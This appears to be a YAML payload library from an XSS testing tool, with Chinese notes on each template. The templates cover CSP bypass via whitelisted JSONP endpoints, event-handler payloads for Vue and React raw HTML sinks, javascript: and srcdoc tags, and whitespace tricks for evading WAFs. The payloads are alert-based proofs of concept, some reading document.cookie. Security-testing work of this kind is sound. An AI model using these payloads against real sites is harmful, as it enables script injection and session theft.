  # ---- CSP 存在时的绕过 ----
  # 目标有 CSP 时，inline script 与事件属性都被 script-src 挡掉，但**白名单里的域名**
  # 仍然可以加载脚本。所以这条路不是绕 CSP 本身，而是让 CSP 替你放行一个能执行代码的端点。

  - id: xss.generic.csp.jsonp
    name: 借白名单域上的 JSONP 端点绕 CSP
    desc: >-
      目标配了 CSP、script-src 里带着第三方域名（CDN、统计、老接口域）时用。
      白名单域上只要有任一个把查询参数当回调名回显的 JSONP 端点，就能借它执行任意 JS——
      CSP 拦的是「脚本从哪来」，而这里脚本正是从白名单域来的。先读响应头里的 CSP 找出
      script-src 列表，再逐个域名找 ?callback= 这类端点。回调名必须是合法的 JS 标识符，
      所以载荷里写死 alert；要换成别的函数名直接改这一段。目标没有 CSP、或白名单里
      只有静态资源域名时这条不成立，硬凑不了。
    vuln: [xss]
    content_type: [html]
    component: []
    version: "*"
    slots:
      cb:
        options: [callback, cb, jsonp, _callback, callBack]
        default: callback
    body: <script src="https://<<trusted>>/<<endpoint>>?<<cb>>=alert"></script>
    vars: [trusted, endpoint]
    requires: [reflect, weak-hardening]
    status: theory
    source: 手写
    license: ""
    updated: 2026-09-18

  # ---- 前端框架的原始 HTML sink ----

  - id: xss.generic.framework.rawhtml
    name: 框架的原始 HTML sink（v-html / dangerouslySetInnerHTML）
    desc: >-
      数据被绑到 Vue 的 v-html、React 的 dangerouslySetInnerHTML、或任何直接写 innerHTML
      的绑定点上时用。这类 sink 不做净化，但**script 标签不会执行**——innerHTML 插入的
      script 从来就不跑，所以必须走事件属性（img 的 onerror、svg 的 onload）。
      同一条数据走 Vue 的 {{ }} 插值或 JSX 的字符串子节点时是转义的，那种落点这条不生效，
      得先找到真正的 raw sink。React 里连属性值也是转义的，属性闭合那条路走不通。
    vuln: [xss]
    content_type: [html]
    component: []
    version: "*"
    slots:
      tag:
        options:
          - {id: img,     name: "<img src=x onerror=（src 必然加载失败才会触发）", head: '<img src=x onerror=', tail: '>'}
          - {id: svg,     name: "<svg onload=",                                    head: '<svg onload=', tail: '>'}
          - {id: details, name: "<details open ontoggle=",                         head: '<details open ontoggle=', tail: '>'}
          - {id: input,   name: "<input autofocus onfocus=",                       head: '<input autofocus onfocus=', tail: '>'}
        default: img
      js:
        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
        default: "alert(1)"
    body: <<tag.head>><<js>><<tag.tail>>
    vars: []
    requires: [dom-sink]
    status: lab
    source: 手写
    license: ""
    updated: 2026-09-18

  # ---- 属性上下文里的伪协议 ----
  # scheme.javascript / scheme.data 给的是**裸的伪协议串**（粘进已有的属性里）。
  # 这里给的是**带完整标签**的版本：落点没有现成标签可用、或者要借 srcdoc 这类
  # 「属性值本身被当文档解析」的位置时用。

  - id: xss.generic.scheme.tag
    name: 带标签的伪协议（href / src / srcdoc / data）
    desc: >-
      注入点能新建标签、且落点是某个「地址位」或「文档位」时用。srcdoc 最特殊：
      它的属性值会被当独立的 HTML 文档解析，所以里面直接写 script 就行，不需要引号闭合；
      但也因此受父页面的 CSP 管，没绕开任何东西。iframe src 的 javascript: 加载即执行，
      a href 与 form action 都要用户点一下才执行。object data 只在部分浏览器与老内核上有效，
      现代 Chrome 基本不执行，别当首选。整段内容落在**双引号属性里面**时，
      引号要先闭合再用 probe.quote 那条。
    vuln: [xss]
    content_type: [html]
    component: []
    version: "*"
    slots:
      tag:
        options:
          - {id: iframe_srcdoc, name: "<iframe srcdoc=（属性值被当独立文档解析，加载即执行）", head: '<iframe srcdoc="<script>', tail: '</script>"></iframe>'}
          - {id: iframe_src,    name: "<iframe src=javascript:（加载即执行）",              head: '<iframe src="javascript:', tail: '"></iframe>'}
          - {id: object_data,   name: "<object data=javascript:（只在部分浏览器上有效）",    head: '<object data="javascript:', tail: '"></object>'}
          - {id: a_href,        name: "<a href=javascript:（要用户点一下）",                 head: '<a href="javascript:', tail: '">click</a>'}
          - {id: form_action,   name: "<form action=javascript:（要用户点提交）",            head: '<form action="javascript:', tail: '"><input type="submit"></form>'}
        default: iframe_srcdoc
      js:
        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
        default: "alert(1)"
    body: <<tag.head>><<js>><<tag.tail>>
    vars: []
    requires: [reflect]
    status: lab
    source: 手写
    license: ""
    updated: 2026-09-18

  # ---- WAF / 过滤器绕过写法 ----

  - id: xss.generic.waf.attrsep
    name: 属性间用编码空白分隔（属性不加引号）
    desc: >-
      过滤器按「一个空格 + 属性名」匹配标签内部结构时用：标签名与属性之间、属性与属性之间
      改用什么分隔，属性值一律不加引号。前四种是**真的空白字符**（多个空格、%0c），
      直接落在页面里就成立；%0a / %09 是百分号编码形态，只有当值会**先被解码一次**
      再写进 HTML 时才成立——服务端原样写进去的话浏览器看到的是字面的 %0a，
      标签会变成 <img%0asrc=x 这种无效标签名，什么也不会触发。目标没做这层匹配时
      用 probe.tag 更直观。
    vuln: [xss]
    content_type: [html]
    component: []
    version: "*"
    slots:
      gap:
        options:
          - {id: sp,  name: "多个空格（过滤器只按单空格匹配时）",        seq: "   "}
          - {id: ff,  name: "%0c 换页符（真空白字符，直接落在页面里也行）", seq: "\f"}
          - {id: nl,  name: "%0a（值会先被解码一次时用）",              seq: "%0a"}
          - {id: tab, name: "%09（值会先被解码一次时用）",              seq: "%09"}
        default: sp
      js:
        options: ["alert(1)", "alert(document.domain)", "alert(document.cookie)"]
        default: "alert(1)"
    body: <img<<gap.seq>>src=x<<gap.seq>>onerror=<<js>>>
    vars: []
    requires: [reflect, weak-filter]
    status: lab
    source: 手写
    license: ""
    updated: 2026-09-18
